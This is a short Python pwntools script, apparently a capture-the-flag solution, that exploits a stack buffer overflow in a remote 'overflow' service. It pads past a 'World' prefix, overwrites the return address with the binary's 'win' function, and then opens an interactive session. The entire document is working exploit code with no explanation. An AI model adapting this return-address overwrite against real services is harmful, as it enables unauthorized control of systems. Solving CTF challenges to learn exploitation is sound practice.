#!/usr/bin/python3
from pwn import *

elf = ELF("./overflow")

p = remote("35.228.52.143", 5669)

#gdb.attach(p)
buf =  b"World"
buf += b"\x00" * 3
buf += b"\x41"*8
buf += p64(elf.symbols['win'])

p.sendlineafter("Hello?", buf)
p.interactive()

